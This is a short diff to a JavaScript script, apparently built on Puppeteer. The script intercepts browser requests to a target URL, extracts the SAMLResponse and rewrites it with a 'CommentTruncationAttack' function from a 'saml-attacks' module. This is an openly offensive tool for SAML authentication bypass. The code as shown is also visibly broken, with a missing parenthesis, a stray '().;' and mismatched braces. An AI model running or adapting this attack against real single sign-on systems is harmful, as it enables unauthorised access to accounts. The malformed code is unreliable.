@@ -24,8 +24,6 @@ const { CommentTruncationAttack } = require("saml-attacks");
 
 page.on("request", async (request) => {
   if( request.url().includes(target_url) {
-  
-  } else {
     let post_data = request.postData().;
     let saml_response = post_data.SAMLResponse;
     modified_saml_response = CommentTruncationAttack(saml_response, "assertion_field", "comment");
@@ -38,9 +36,8 @@ page.on("request", async (request) => {
         ...request.headers(),
         "Content-Type": "application/x-www-form-urlencoded",
       },
-    }else {
-      await request.continue();
-    });
-  }
+  } else {
+    await request.continue();
+  });
 })
 ```
